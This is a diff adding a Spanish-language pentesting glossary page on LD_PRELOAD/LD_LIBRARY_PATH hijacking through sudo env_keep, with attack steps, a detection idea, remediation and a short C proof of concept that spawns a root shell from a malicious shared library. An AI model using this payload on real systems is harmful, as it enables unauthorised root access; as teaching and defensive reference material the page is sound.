@@ -1,0 +1,47 @@
+---
+title: "LD_PRELOAD / LD_LIBRARY_PATH hijacking"
+description: "sudo -l permite ejecutar programa con env_keep+=\"LD_PRELOAD\"."
+---
+
+# LD_PRELOAD / LD_LIBRARY_PATH hijacking
+
+<p className="glossary-answer">sudo -l permite ejecutar programa con env_keep+="LD_PRELOAD".</p>
+
+**Categoría:** [Linux · Privilege Escalation](/glosario)
+
+🎯 **Trinchera** — `sudo -l` permite ejecutar programa con
+`env_keep+="LD_PRELOAD"`. Compilas una `.so` con función
+constructor maliciosa, defines `LD_PRELOAD=/tmp/evil.so`, ejecutas
+el sudo. Tu lib se carga primero como root.
+
+🔗 **Kill chain** — Enumerar `Defaults env_keep` en `sudoers`. Si
+incluye `LD_PRELOAD` o `LD_LIBRARY_PATH` (más raro), explotación
+trivial.
+
+📡 **Huella defensiva** — Auditd sobre `open()` de archivos `.so`
+desde `/tmp` por procesos elevados.
+
+⚠️ **Falso amigo** — `LD_PRELOAD` se ignora en binarios SUID por
+defecto (a menos que `env_keep` lo permita explícitamente).
+
+🛡️ **Remediación** — Auditar `Defaults env_keep` en sudoers y
+quitar `LD_PRELOAD` y `LD_LIBRARY_PATH`.
+
+```c
+// evil.c
+#include <stdlib.h>
+void __attribute__((constructor)) init() {
+    setuid(0); system("/bin/bash -p");
+}
+// gcc -fPIC -shared -o evil.so evil.c
+```
+
+---
+
+← [Volver al glosario completo](/glosario)
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"DefinedTerm","name":"LD_PRELOAD / LD_LIBRARY_PATH hijacking","description":"sudo -l permite ejecutar programa con env_keep+=\"LD_PRELOAD\".","inDefinedTermSet":{"@type":"DefinedTermSet","name":"Glosario táctico de pentesting","url":"https://rootea.es/glosario"},"url":"https://rootea.es/glosario/ld-preload-ld-library-path-hijacking"}`}</script>
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Inicio","item":"https://rootea.es"},{"@type":"ListItem","position":2,"name":"Glosario táctico","item":"https://rootea.es/glosario"},{"@type":"ListItem","position":3,"name":"LD_PRELOAD / LD_LIBRARY_PATH hijacking","item":"https://rootea.es/glosario/ld-preload-ld-library-path-hijacking"}]}`}</script>
+
+_Última actualización: 2026-06-11_
